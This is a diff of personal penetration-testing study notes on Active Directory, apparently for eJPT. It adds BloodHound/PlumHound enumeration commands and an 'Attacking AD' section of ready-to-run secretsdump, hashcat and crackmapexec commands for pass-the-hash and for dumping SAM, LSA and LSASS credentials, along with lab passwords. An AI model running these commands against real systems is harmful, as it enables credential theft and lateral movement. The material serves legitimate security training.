@@ -489,12 +489,33 @@ IPv6 Attack     If IPv6 is enabled and there is no DNS resolution in this case w
 .          mitm6 -d <domain ex. raman.local>
 .          you need to do such an event like rebooting the system. if successful check the loot file in your kali directory 
 
-**enum after getting initial access**
+**Domain enumeration after getting initial access**
 POST-COMPROMISE AD ENUMERATION
 ldapdomaindump     (you can use this instead of ntlmrelayx.py -6)
 .          ldapdomaindump ldaps://10.0.2.16 -u 'raman' -p password
 bloodhound
+.          neo4j console  (credentials neo4j:to0or)
+.          bloodhound   (credentials neo4j:to0or)
+.          bloodhound-python -d raman.local -u machine1 -p Ab2002.. -ns <DC - IP> -c all   (import the jason files into bloodhound)
+plumhound
+     make sure that neo4j & bloodhound are running
+.          python3 plumhound.py --easy -p to0or
+.          python3 plumhound.py -x tasks/default.tasks -p to0or
+.          cd reports && firefox index.html
+pingcastle
+.          this tool is good for consultation. it will enumerate the whole AD and give some suggestions
 
+**Attacking AD**
+.          secretsdump.py raman.local/machine1:to0or@10.10.16.14     (dump the hashes without metasploit)
+.          secretsdump.py machine1:@10.10.16.14 -hashes <hash>     (dump the hashes without metasploit)
+.          hashcat -m <ntlm mode ex. 1000> ntlm.txt rockyou.txt     (you only need to put the NTLM portion from NT:NTLM in the ntlm.txt file)
+.          crackmapexec smb <ip/CIDR> -u <user> -d raman.local -p <password>     (pass the password)
+.          crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth     (pass the hash) (only work on NTLMv1, for NTLMv2 can be relayed)
+.          crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam    (dump the sam database)
+.          crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --shares    (enumerate shares)
+.          crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -lsa    (dump lsa or local security authority. it may have some sensitive information)
+.          crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy    (dump lsass. it may have some secret credentials that secretdump didn't reflect)
+.          cmedb     (crackmapexec database)
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
